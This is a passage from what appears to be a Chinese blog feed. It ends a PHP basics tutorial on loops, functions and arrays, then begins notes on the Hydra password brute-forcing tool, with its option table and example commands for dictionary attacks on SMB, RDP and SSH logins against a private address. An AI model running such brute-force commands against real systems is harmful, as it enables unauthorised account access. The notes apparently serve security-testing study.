delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/12/12/kWXAxYRbz168ovj.png" alt="for.png"></p><h3 id="foreach-循环"><a href="#foreach-循环" class="headerlink" title="foreach 循环"></a>foreach 循环</h3><p>foreach 循环只适用于数组，并用于遍历数组中的每个键/值对。</p><hr><h4 id="语法-7"><a href="#语法-7" class="headerlink" title="语法"></a>语法</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">// 每进行一次循环，当前数组元素的值就会被赋值给 $value 变量，并且数组指针会逐一地移动，直到到达最后一个数组元素。</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$array</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  code to be executed<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="实例-7"><a href="#实例-7" class="headerlink" title="实例"></a>实例</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token variable">$colors</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"red"</span><span class="token punctuation">,</span><span class="token string">"green"</span><span class="token punctuation">,</span><span class="token string">"blue"</span><span class="token punctuation">,</span><span class="token string">"yellow"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$colors</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token string">"$value &lt;br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/12/12/kdhcD5Rsm1XgWJn.png" alt="foreach.png"></p><h2 id="PHP-函数"><a href="#PHP-函数" class="headerlink" title="PHP 函数"></a>PHP 函数</h2><h3 id="用户自定义函数"><a href="#用户自定义函数" class="headerlink" title="用户自定义函数"></a>用户自定义函数</h3><p>函数是可以在程序中重复使用的语句块，PHP 可以创建自定义函数。页面加载时函数不会立即执行，只有在被调用时才会执行。</p><ul><li><p>函数名能够以字母或下划线开头（而非数字）。</p></li><li><p>函数名对大小写不敏感。</p></li></ul><hr><h4 id="语法-8"><a href="#语法-8" class="headerlink" title="语法"></a>语法</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">// 用户定义的函数声明以单词 "function" 开头：</span><span class="token keyword">function</span> <span class="token function">functionName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  被执行的代码<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="实例-8"><a href="#实例-8" class="headerlink" title="实例"></a>实例</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">// 在下面的例子中，创建了一个 sayHi() 的函数 "{" 指的是函数代码的开始，"}" 指的是函数的结束。此函数输出 "hello world!"</span><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">sayHi</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token string">"Hello world!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">sayhi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 调用函数</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/12/13/NVIoUG5mTu4X2CM.png" alt="php1.png"></p><h3 id="函数参数"><a href="#函数参数" class="headerlink" title="函数参数"></a>函数参数</h3><p>PHP 可以通过参数向函数传递信息，参数类似变量。</p><p>参数被定义在函数之后的括号中。括号中可以添加任意多个参数，只要用逗号隔开就行。</p><hr><h4 id="实例-9"><a href="#实例-9" class="headerlink" title="实例"></a>实例</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">// 下面的例子中的函数有一个参数（$fname）。当调用 familyName() 函数时，我们同时要传递一个名字（例如 Bill），这样会输出不同的名字，但是姓氏相同：</span><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">familyName</span><span class="token punctuation">(</span><span class="token variable">$fname</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token string">"$fname Zhang.&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">familyName</span><span class="token punctuation">(</span><span class="token string">"Li"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">familyName</span><span class="token punctuation">(</span><span class="token string">"Hong"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">familyName</span><span class="token punctuation">(</span><span class="token string">"Tao"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">familyName</span><span class="token punctuation">(</span><span class="token string">"Xiao Mei"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">familyName</span><span class="token punctuation">(</span><span class="token string">"Jian"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/12/13/MWEBk1FsKOjXDYH.png" alt="php2.png"></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">// 下面的例子中的函数有两个参数（$fname 和 $year）</span><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">familyName</span><span class="token punctuation">(</span><span class="token variable">$fname</span><span class="token punctuation">,</span><span class="token variable">$year</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token string">"$fname Zhang. Born in $year &lt;br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">familyName</span><span class="token punctuation">(</span><span class="token string">"Li"</span><span class="token punctuation">,</span><span class="token string">"1975"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">familyName</span><span class="token punctuation">(</span><span class="token string">"Hong"</span><span class="token punctuation">,</span><span class="token string">"1978"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">familyName</span><span class="token punctuation">(</span><span class="token string">"Tao"</span><span class="token punctuation">,</span><span class="token string">"1983"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/12/13/GEtCLI2hkuWnDzS.png" alt="php3.png"></p><h4 id="默认参数"><a href="#默认参数" class="headerlink" title="默认参数"></a>默认参数</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">// 下面的例子展示了如何使用默认参数。如果我们调用没有参数的 setHeight() 函数，它的参数会取默认值：</span><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">setHeight</span><span class="token punctuation">(</span><span class="token variable">$minheight</span><span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token string">"The height is : $minheight &lt;br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">setHeight</span><span class="token punctuation">(</span><span class="token number">350</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setHeight</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 将使用默认值 50</span><span class="token function">setHeight</span><span class="token punctuation">(</span><span class="token number">135</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setHeight</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/12/13/JzOfiYrejP2psBI.png" alt="php4.png"></p><h3 id="函数返回值"><a href="#函数返回值" class="headerlink" title="函数返回值"></a>函数返回值</h3><hr><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">// 使用 return 语句，使函数返回值。</span><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">sum</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">,</span><span class="token variable">$y</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token variable">$z</span><span class="token operator">=</span><span class="token variable">$x</span><span class="token operator">+</span><span class="token variable">$y</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token variable">$z</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token string">"5 + 10 = "</span> <span class="token punctuation">.</span> <span class="token function">sum</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"7 + 13 = "</span> <span class="token punctuation">.</span> <span class="token function">sum</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"2 + 4 = "</span> <span class="token punctuation">.</span> <span class="token function">sum</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/12/13/axg6Oihj7PUK4GI.png" alt="php5.png"></p><h3 id="可变函数"><a href="#可变函数" class="headerlink" title="可变函数"></a>可变函数</h3><p>PHP 支持可变函数的概念。可变函数就是：如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。</p><hr><h4 id="实例-10"><a href="#实例-10" class="headerlink" title="实例"></a>实例</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">// 下面的例子中，定义了 3 个函数，并使用 $func() 来调用这些函数</span><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"In foo()&lt;br /&gt;\n"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">bar</span><span class="token punctuation">(</span><span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> "In <span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> argument was <span class="token string">'$arg'</span><span class="token punctuation">.</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/&gt;</span></span></span>\<span class="token package">n</span>"<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 使用 echo 的包装函数</span><span class="token keyword">function</span> <span class="token function">echoit</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$string</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$func</span> <span class="token operator">=</span> <span class="token string">'foo'</span><span class="token punctuation">;</span><span class="token variable">$func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 调用 foo()</span><span class="token variable">$func</span> <span class="token operator">=</span> <span class="token string">'bar'</span><span class="token punctuation">;</span><span class="token variable">$func</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 调用 bar()</span><span class="token variable">$func</span> <span class="token operator">=</span> <span class="token string">'echoit'</span><span class="token punctuation">;</span><span class="token variable">$func</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 调用 echoit()</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/12/13/LuxTDQ2kA8heMXY.png" alt="php6.png"></p><h2 id="PHP-数组"><a href="#PHP-数组" class="headerlink" title="PHP 数组"></a>PHP 数组</h2><h3 id="数组的类型"><a href="#数组的类型" class="headerlink" title="数组的类型"></a>数组的类型</h3><ul><li>索引数组 - 带有数字索引的数组</li><li>关联数组 - 带有指定键的数组</li><li>多维数组 - 包含一个或多个数组的数组</li></ul><h3 id="创建数组"><a href="#创建数组" class="headerlink" title="创建数组"></a>创建数组</h3><p>在 PHP 中， <code>array()</code> 函数用于创建数组：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="索引数组"><a href="#索引数组" class="headerlink" title="索引数组"></a>索引数组</h3><p>PHP 有两种创建索引数组的方法：</p><ol><li>索引是自动分配的（索引从 0 开始）：</li></ol><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$cars</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"porsche"</span><span class="token punctuation">,</span><span class="token string">"BMW"</span><span class="token punctuation">,</span><span class="token string">"Volvo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>索引是手动分配的</li></ol><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$cars</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"porsche"</span><span class="token punctuation">;</span><span class="token variable">$cars</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"BMW"</span><span class="token punctuation">;</span><span class="token variable">$cars</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"volvo"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="实例-11"><a href="#实例-11" class="headerlink" title="实例"></a>实例</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">// 创建名为 $cars 的索引数组，为其分配 3 个元素，然后输出包含数组值的一段文本</span><span class="token delimiter">&lt;?php</span><span class="token variable">$cars</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"porsche"</span><span class="token punctuation">,</span><span class="token string">"BMW"</span><span class="token punctuation">,</span><span class="token string">"volvo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"I like"</span> <span class="token punctuation">.</span> <span class="token variable">$cars</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">", "</span> <span class="token punctuation">.</span> <span class="token variable">$cars</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">" and "</span> <span class="token punctuation">.</span> <span class="token variable">$cars</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"."</span><span class="token punctuation">;</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/12/27/UkN5m2W1z3jZegi.png" alt="phpsz-1.png"></p><h3 id="获取数组长度"><a href="#获取数组长度" class="headerlink" title="获取数组长度"></a>获取数组长度</h3><p>count() 函数用于返回数组的长度</p><h4 id="实例-12"><a href="#实例-12" class="headerlink" title="实例"></a>实例</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$cars</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"porsche"</span><span class="token punctuation">,</span><span class="token string">"BMW"</span><span class="token punctuation">,</span><span class="token string">"Volvo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$cars</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/12/27/gMfrBZKCkq9E4QO.png" alt="phpsz-2.png"></p><h3 id="遍历索引数组"><a href="#遍历索引数组" class="headerlink" title="遍历索引数组"></a>遍历索引数组</h3><p>使用 for 循环遍历并输出索引数组的所有值</p><h4 id="实例-13"><a href="#实例-13" class="headerlink" title="实例"></a>实例</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$cars</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"porsche"</span><span class="token punctuation">,</span><span class="token string">"BMW"</span><span class="token punctuation">,</span><span class="token string">"Volvo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$arrlength</span><span class="token operator">=</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$cars</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">&lt;</span><span class="token variable">$arrlength</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token variable">$cars</span><span class="token punctuation">[</span><span class="token variable">$x</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/12/27/kZrNjEGunFcIU6m.png" alt="phpsz-3.png"></p><h3 id="关联数组"><a href="#关联数组" class="headerlink" title="关联数组"></a>关联数组</h3><p>关联数组就是给数组的索引值指定相应的值。你可以把它们想象为一组卡片，每张卡片上半部分是索引而下半部分是数值。关联数组的索引值可以是任意非空值，而且关联数组的元素没有特定的顺序。</p><p>有两种创建关联数组的方法：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$age</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"Bill"</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">"35"</span><span class="token punctuation">,</span><span class="token string">"Steve"</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">"37"</span><span class="token punctuation">,</span><span class="token string">"Elon"</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">"43"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$age</span><span class="token punctuation">[</span><span class="token string">'Bill'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"63"</span><span class="token punctuation">;</span><span class="token variable">$age</span><span class="token punctuation">[</span><span class="token string">'Steve'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"56"</span><span class="token punctuation">;</span><span class="token variable">$age</span><span class="token punctuation">[</span><span class="token string">'Elon'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"47"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="实例-14"><a href="#实例-14" class="headerlink" title="实例"></a>实例</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$age</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"Bill"</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">"63"</span><span class="token punctuation">,</span><span class="token string">"Steve"</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">"56"</span><span class="token punctuation">,</span><span class="token string">"Elon"</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">"47"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"Elon is "</span> <span class="token punctuation">.</span> <span class="token variable">$age</span><span class="token punctuation">[</span><span class="token string">'Elon'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">" years old."</span><span class="token punctuation">;</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/12/27/awtFfKlociUg821.png" alt="phpsz-4.png"></p><h3 id="遍历关联数组"><a href="#遍历关联数组" class="headerlink" title="遍历关联数组"></a>遍历关联数组</h3><p>使用 foreach 循环遍历并输出关联数组的所有值</p><h3 id="实例-15"><a href="#实例-15" class="headerlink" title="实例"></a>实例</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$age</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"Bill"</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">"63"</span><span class="token punctuation">,</span><span class="token string">"Steve"</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">"56"</span><span class="token punctuation">,</span><span class="token string">"Elon"</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">"47"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$age</span> <span class="token keyword">as</span> <span class="token variable">$x</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token variable">$x_value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token string">"Key="</span> <span class="token punctuation">.</span> <span class="token variable">$x</span> <span class="token punctuation">.</span> <span class="token string">", Value="</span> <span class="token punctuation">.</span> <span class="token variable">$x_value</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/12/27/xbpQvtrJeSNoBVM.png" alt="phpsz-5.png"></p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><hr><p><a href="https://zh.wikipedia.org/wiki/PHP" target="_blank" rel="noopener">PHP</a></p><p><a href="https://wangye.org/blog/archives/606/" target="_blank" rel="noopener">关闭PHP Credits和隐藏的GUID图片Logo彩蛋的显示</a></p><p><a href="https://blog.csdn.net/ymlbright/article/details/39897041" target="_blank" rel="noopener">Php彩蛋</a></p><p><a href="https://www.w3school.com.cn/php/php_variables.asp" target="_blank" rel="noopener">w3school php 教程</a></p><p><a href="https://www.php.net/manual/zh/language.variables.php" target="_blank" rel="noopener">PHP 官方手册</a></p><p><a href="https://www.php.cn/php-weizijiaocheng-360746.html" target="_blank" rel="noopener">php：对象（object）数据类型实例详解</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hydra笔记</title>
      <link href="/2020/01/18/Hydra%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/01/18/Hydra%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是-Hydra？"><a href="#什么是-Hydra？" class="headerlink" title="什么是 Hydra？"></a>什么是 Hydra？</h2><hr><p><img src="https://i.loli.net/2020/01/19/TAEmX4OK2Uayvb1.jpg" alt="hydra.jpg"></p><p>Hydra 是一个暴力破解工具，使用弱口令字典进行爆破。</p><h2 id="Hydra-支持的协议"><a href="#Hydra-支持的协议" class="headerlink" title="Hydra 支持的协议"></a>Hydra 支持的协议</h2><hr><pre><code>Asterisk、AFP、Cisco AAA、Cisco authCisco enable、CVS、Firebird、FTPHTTP-FORM-GET、HTTP-FORM-POSTHTTP-GET、HTTP-HEAD、HTTP-POSTHTTP-PROXY、HTTPS-FORM-GETHTTPS-FORM-POST、HTTPS-GETHTTPS-HEAD、HTTPS-POSTHTTP-Proxy、ICQ、IMAP、IRC、LDAPMS-SQL、MYSQL、NCP、NNTP、Oracle ListenerOracle SID、Oracle、PC-Anywhere、PCNFSPOP3、POSTGRES、RDP、Rexec、RloginRsh、RTSP、SAP/R3、SIP、SMB、SMTPSMTP Enum、SNMP v1+v2+v3、SOCKS5SSH (v1 and v2)、SSHKEY、SubversionTeamspeak (TS2)、Telnet、VMware-AuthVNC、XMPP</code></pre><h2 id="Hydra-使用（命令行）"><a href="#Hydra-使用（命令行）" class="headerlink" title="Hydra 使用（命令行）"></a>Hydra 使用（命令行）</h2><hr><table><thead><tr><th align="center">参数</th><th align="center">用途</th></tr></thead><tbody><tr><td align="center">-l</td><td align="center">指定单个用户名，适合在知道目标用户名的情况下使用</td></tr><tr><td align="center">-L</td><td align="center">指定多个用户名，适合字典爆破</td></tr><tr><td align="center">-p</td><td align="center">指定单个密码，适合在知道密码的情况下使用</td></tr><tr><td align="center">-P</td><td align="center">指定多个密码，适合字典爆破</td></tr><tr><td align="center">-C</td><td align="center">当用户名和密码存储在同一个文件时使用此参数，文件格式必须是【用户名:密码】</td></tr><tr><td align="center">-M</td><td align="center">指定多个攻击目标，文件格式必须是【地址:端口】</td></tr><tr><td align="center">-t</td><td align="center">线程数（默认为16）</td></tr><tr><td align="center">-s</td><td align="center">指定端口,适用于目标端口非默认的情况下使用</td></tr><tr><td align="center">-S</td><td align="center">指定爆破时使用 SSL 链接</td></tr><tr><td align="center">-R</td><td align="center">继续从上一次爆破进度继续爆破</td></tr><tr><td align="center">-vV</td><td align="center">显示爆破详细信息</td></tr><tr><td align="center">-o</td><td align="center">输出文件</td></tr><tr><td align="center">-f</td><td align="center">一旦爆破成功一个就要停止爆破</td></tr><tr><td align="center">-e</td><td align="center">可选项，n：空密码探测，s：使用指定用户名和密码试探</td></tr><tr><td align="center">server</td><td align="center">代表需要攻击的目标（单个）</td></tr><tr><td align="center">service</td><td align="center">爆破时使用的协议</td></tr><tr><td align="center">OPT</td><td align="center">爆破模块的额外参数，可以使用 -U 参数来查看模块支持哪些参数</td></tr></tbody></table><h2 id="使用案例"><a href="#使用案例" class="headerlink" title="使用案例"></a>使用案例</h2><hr><h3 id="爆破-smb"><a href="#爆破-smb" class="headerlink" title="爆破 smb"></a>爆破 smb</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 字典爆破</span>hydra -L user.txt -P pass.txt -V 192.168.150.144 smb -o smb.log<span class="token comment" spellcheck="true"># 知道用户名的情况下</span>hydra -l root -P pass.txt -V 192.168.150.144 smb -o smb.log<span class="token comment" spellcheck="true"># 知道密码的情况下</span>hydra -L user.txt -p 123456 -V 192.168.150.144 smb -o smb.log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="爆破-rdp"><a href="#爆破-rdp" class="headerlink" title="爆破 rdp"></a>爆破 rdp</h3><pre class="line-numbers language-bash"><code class="language-bash">hydra -L user.txt -P pass.txt -V 192.168.150.144 rdp -o rdp.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="爆破-ssh"><a href="#爆破-ssh" class="headerlink" title="爆破 ssh"></a>爆破 ssh</h3><pre class="line-numbers language-bash"><code class="language-bash">hydra -L user.txt -P pass.txt -V 192.168.150.144 <span class="token function">ssh</span> -o ssh.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="爆破-ftp"><a href="#爆破-ftp" class="headerlink" 